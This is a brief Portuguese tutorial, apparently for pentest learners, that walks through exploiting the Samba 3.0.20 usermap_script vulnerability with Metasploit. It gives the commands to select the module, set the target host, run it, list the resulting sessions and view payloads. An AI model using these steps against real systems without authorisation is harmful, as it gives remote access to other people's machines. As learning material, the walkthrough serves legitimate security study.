<h1 align="center">Explorando Vulnerabilidades no Linux</h1>
<hr>

Agora que achamos as vulnerabilidades no servico do Samba 3.0.20 , vamos explorar elas e aprendar um pouco mais sobre isso.

```sh
msf5> search type:exploit fullname:"Samba 3.0.20"
msf5> use exploit/multi/samba/usermap_script
```

Agora que estamos usando o modulo , vamos explorar:

```sh
msf5> exploit(multi/samba/usermap_script) > set RHOST <HOST>
msf5> exploit(multi/samba/usermap_script) > exploit
exploit(multi/samba/usermap_script) > sessions
```

Se quisermos usar um payload diferente:

```sh
exploit(multi/samba/usermap_script) > show payloads
```

